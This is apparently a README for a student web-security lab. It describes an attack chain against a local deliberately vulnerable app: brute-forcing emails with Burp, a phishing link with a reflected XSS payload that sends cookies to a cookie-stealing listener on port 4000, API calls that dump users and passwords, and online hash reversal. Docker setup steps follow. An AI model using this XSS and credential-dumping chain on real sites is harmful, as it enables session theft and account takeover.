# TP Seguridad Apps Web - Grupo 3

## Vector de ataque
1) Hacer fuerza bruta con Burp para obtener mails de usuarios
2) Enviar mails con link malicioso: `http://localhost:3000/html/home/user/dashboard/index.html?nombre=Juan%3Cscript%3Evar%20xhr%20=%20new%20XMLHttpRequest();xhr.open(%22POST%22,%27http://localhost:4000/damecookie%27);xhr.withCredentials%20=%20true;xhr.send()%3C/script%3E`
3) Leer las cookies e intentar entrar al sitio
4) Ver los requests que se hacen
5) Hacer GET /api/v1/User y GET /api/v1/User?distinct=password para obtener un array de usuarios y un array de sus respectivas contraseñas
6) Buscar contraseñas hasheadas en https://hashtoolkit.com/reverse-hash


## Como levantar el ambiente
1) Tener instalado docker (Si no lo tenes podes, en linux podes instalarlo con estos simples comandos)
    `curl -fsSL https://get.docker.com -o get-docker.sh`
    `sh get-docker.sh`
2) Crear la imagen de docker del servidor, se peude hacer estando en /intracorp (de este repositorio) y corriendo
      `docker build . -t tp3-seguridad-web-g3-servidorweb`
3) Crear la red virtual en docker
      `docker network create tp-seguridad-web-g3`
4) Dejar corriendo tanto el servidor como mongod
      `docker container run --network tp-seguridad-web-g3 -p 27017:27017 --name mongo mongo`
      `docker container run --network tp-seguridad-web-g3 -p 3000:3000 tp3-seguridad-web-g3-servidorweb`
5) Para dejar corriendo el robador de cookies hay que crear la imagen, estando en /cookie-listener (de este repositorio) y corriendo
      `docker build . -t tp3-seguridad-web-g3-cookie-listener`
      `docker container run --network tp-seguridad-web-g3 -p 4000:4000 tp3-seguridad-web-g3-cookie-listener`
